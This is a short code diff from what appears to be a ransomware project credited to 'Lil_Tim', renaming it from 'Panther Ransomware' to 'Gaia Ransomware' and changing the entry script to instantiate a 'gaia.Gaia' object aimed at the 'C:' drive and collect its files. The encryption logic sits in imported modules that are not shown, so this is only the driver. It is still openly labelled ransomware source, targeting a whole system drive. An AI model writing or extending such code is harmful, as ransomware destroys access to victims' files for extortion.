@@ -1,9 +1,9 @@
 '''
  >>> Code by Lil_Tim
- >>> Panther Ransomware
+ >>> Gaia Ransomware
 '''
 
-import panther as pth
+import gaia
 
-ransom = pth.Ransomware('main.py','lol',1,10)
-ransom.get_parameters()
+ransom = gaia.Gaia('C:')
+ransom.get_files()
